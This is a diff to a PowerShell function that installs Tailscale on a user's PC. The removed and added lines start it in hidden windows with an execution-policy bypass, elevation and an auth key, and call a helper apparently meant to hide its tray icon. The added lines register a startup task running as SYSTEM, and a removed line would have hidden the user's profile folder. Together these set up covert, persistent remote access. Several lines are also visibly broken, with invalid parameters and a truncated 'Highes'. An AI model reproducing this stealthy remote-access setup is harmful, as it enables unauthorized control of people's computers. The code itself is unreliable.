@@ -36,19 +36,15 @@ function installTailscale {
 
   ## Configure Tailscale on users pc
   Set-Location C:\tailscale
-  Write-Output "Get-Item 'C:\Users\$uName' -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
-Set-Location C:\tailscale
-.\tailscaled.exe  -windowstyle hidden -ep bypass -Verb RunAs
-.\tailscale-ipn.exe -windowstyle hidden
-.\notify.ps1 -windowstyle hidden -ep bypass -Verb RunAs -ArgumentList C:\Tailscale\tailscale-ipn.exe Hide" >> tailscale.ps1
   Start-Sleep 2
-  .\tailscaled.exe  -windowstyle hidden -ep bypass -Verb RunAs
-  .\tailscale.exe  -windowstyle hidden -ep bypass -Verb RunAs -ArgumentList 'up --authkey $authKey'
-  .\tailscale-ipn.exe -windowstyle hidden -ep bypass -Verb RunAs
-  .\notify.ps1 -windowstyle hidden -ep bypass -Verb RunAs -ArgumentList C:\Tailscale\tailscale-ipn.exe Hide
+  Start-Process -FilePath ".\tailscaled.exe" -windowstyle hidden -ep bypass -Verb RunAs
+  Start-Process -FilePath ".\tailscale.exe" -windowstyle hidden -ep bypass -Verb RunAs -ArgumentList 'up --authkey $authKey'
+  Start-Process -FilePath ".\tailscale-ipn.exe" -windowstyle hidden -ep bypass -Verb RunAs
+  Start-Process -windowstyle hidden -ep bypass -Verb RunAs -ArgumentList -FilePath ".\notify.ps1"  C:\Tailscale\tailscale-ipn.exe Hide
 
+  ## Adds Tailscale to task scheduler
   $name = "Tailscale"
-  $action = New-ScheduledTaskAction -Execute "C:\Tailscale\tailscaled.exe" -Execute "C:\Tailscale\tailscale-ipn.exe" -Execute "C:\Tailscale\tailscale.exe"
+  $action = New-ScheduledTaskAction -Execute "C:\Tailscale\tailscaled.exe, C:\Tailscale\tailscale-ipn.exe, C:\Tailscale\tailscale.exe"
   $trigger = New-ScheduledTaskTrigger -AtStartup
   $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highes
   $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun -AllowStartIfOnBatteries -StartWhenAvailable
